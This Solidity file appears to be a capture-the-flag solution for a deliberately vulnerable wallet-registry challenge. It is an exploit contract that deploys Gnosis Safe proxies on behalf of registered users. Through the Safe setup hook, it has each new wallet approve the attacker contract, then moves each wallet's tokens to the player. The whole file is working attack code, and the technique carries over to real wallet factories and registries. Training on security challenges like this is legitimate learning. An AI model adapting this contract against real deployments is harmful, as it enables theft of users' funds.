// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./WalletRegistry.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "../DamnValuableToken.sol";

contract MaliciousApproval {
    function approve(
        address spender,
        DamnValuableToken token,
        uint256 amount
    ) external {
        token.approve(spender, amount);
    }
}

contract AttackWalletRegistry {
    DamnValuableToken token;
    address contractAddress;
    uint256 constant STEAL_AMOUNT_PER_WALLET = 10 ether;

    constructor(
        address _masterCopy,
        WalletRegistry _walletRegistry,
        GnosisSafeProxyFactory _walletFactory,
        address[] memory _users,
        address _player,
        DamnValuableToken _token
    ) {
        token = _token;
        contractAddress = address(this);
        for (uint256 i = 0; i < _users.length; i++) {
            address[] memory usersPass = new address[](1);
            usersPass[0] = _users[i];

            MaliciousApproval malApproval = new MaliciousApproval();

            bytes memory attackCode = abi.encodeCall(
                MaliciousApproval.approve,
                (address(this), token, STEAL_AMOUNT_PER_WALLET)
            );

            bytes memory initCode = abi.encodeCall(
                GnosisSafe.setup,
                (
                    usersPass,
                    1,
                    address(malApproval),
                    attackCode,
                    address(0),
                    address(0),
                    0,
                    payable(address(0))
                )
            );

            GnosisSafeProxy proxy = _walletFactory.createProxyWithCallback(
                _masterCopy,
                initCode,
                0,
                _walletRegistry
            );

            require(
                _token.allowance(address(proxy), address(this)) ==
                    STEAL_AMOUNT_PER_WALLET,
                "Wallet allowance not sufficient!"
            );

            require(
                _token.balanceOf(address(proxy)) == STEAL_AMOUNT_PER_WALLET,
                "Wallet balance not sufficient!"
            );

            _token.transferFrom(
                address(proxy),
                _player,
                STEAL_AMOUNT_PER_WALLET
            );
        }
    }
}
